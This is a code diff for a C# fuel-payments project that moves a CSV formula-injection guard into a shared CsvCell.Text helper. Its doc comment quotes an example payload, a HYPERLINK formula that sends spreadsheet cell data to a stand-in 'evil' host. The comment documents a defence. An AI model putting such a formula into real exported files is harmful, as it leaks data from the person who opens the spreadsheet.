@@ -1,5 +1,6 @@
 using System.Globalization;
 using System.Text;
+using FuelFlow.SharedKernel.Output;
 
 namespace FuelFlow.Features.Acquiring.Reconciliation;
 
@@ -131,30 +132,13 @@ public static class StatementReconciliationCsv
     /// One cell of TEXT, quoted for RFC 4180 and defused for a spreadsheet.
     /// </summary>
     /// <remarks>
-    /// <para>
-    /// A cell that STARTS with <c>=</c>, <c>+</c>, <c>-</c> or <c>@</c> is a FORMULA to a
-    /// spreadsheet, and this file is opened in one. The destination is what the customer typed, so
-    /// a payer can put <c>=HYPERLINK("http://evil/?d="&amp;A1)</c> there and have the accountant's
-    /// Excel fetch it the moment the file is opened.
-    /// </para>
-    /// <para>
-    /// The apostrophe is Excel's own "this is text" marker: the cell shows what the payer typed,
-    /// and the spreadsheet drops the marker when it reads the value back.
-    /// </para>
-    /// <para>
-    /// The money does not come through here - <see cref="N"/> writes it - because a negative amount
-    /// is a number and not a formula, and the marker would turn the cell into text.
-    /// </para>
+    /// The <c>Destination</c> column is what the customer typed at the terminal, so a payer can put
+    /// <c>=HYPERLINK("http://evil/?d="&amp;A1)</c> there and have the accountant's Excel fetch it the
+    /// moment the file is opened. The guard is <see cref="CsvCell.Text"/>, shared with every other
+    /// CSV this API emits and with the panel's own exporter, so no file can ship without it; the
+    /// reason it looks the way it does is written there.
     /// </remarks>
-    private static string Q(string? value)
-    {
-        var text = value ?? string.Empty;
-
-        if (text.Length > 0 && (text[0] is '=' or '+' or '-' or '@'))
-            text = "'" + text;
-
-        return "\"" + text.Replace("\"", "\"\"") + "\"";
-    }
+    private static string Q(string? value) => CsvCell.Text(value);
 
     /// <summary>
     /// One cell of money, quoted like any other cell and never defused.
